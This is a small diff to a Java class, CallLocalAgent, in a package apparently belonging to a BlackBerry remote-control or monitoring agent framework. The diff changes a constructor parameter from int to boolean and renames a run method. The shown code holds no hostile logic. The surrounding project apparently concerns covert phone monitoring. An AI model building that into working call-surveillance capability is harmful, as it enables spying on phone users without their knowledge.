@@ -13,16 +13,16 @@ import com.ht.rcs.blackberry.utils.DebugLevel;
 public class CallLocalAgent extends Agent {
     private static Debug debug = new Debug("CallLocalAgent", DebugLevel.VERBOSE);
 
-    public CallLocalAgent(int agentStatus) {
+    public CallLocalAgent(boolean agentStatus) {
         super(Agent.AGENT_CALL_LOCAL, agentStatus, true);
     }
 
-    protected CallLocalAgent(int agentStatus, byte[] confParams) {
+    protected CallLocalAgent(boolean agentStatus, byte[] confParams) {
         this(agentStatus);
         parse(confParams);
     }
 
-    public void agentRun() {
+    public void actualRun() {
         debug.trace("run");
         this.sleepUntilStopped();
 
